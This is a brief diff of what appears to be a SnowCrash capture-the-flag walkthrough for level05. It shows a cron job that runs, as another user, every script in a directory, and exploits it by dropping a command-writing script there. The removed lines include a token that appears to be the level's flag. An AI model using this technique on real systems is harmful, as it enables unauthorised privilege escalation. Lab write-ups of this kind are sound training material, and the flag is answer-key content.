@@ -1,3 +1,5 @@
+you have mail
+
 /var/mail/
 level05@SnowCrash:~$ cat /var/mail/level05
 */2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05
@@ -10,6 +12,5 @@ for i in /opt/openarenaserver/* ; do
 	rm -f "$i"
 done
 
-level05@SnowCrash:~$ echo 'getflag > /var/tmp/test' >> /opt/openarenaserver/toto
-
-viuaaale9huek52boumoomioc
+echo 'getflag > /var/tmp/flag' >> /opt/openarenaserver/getflag
+cat /var/tmp/flag
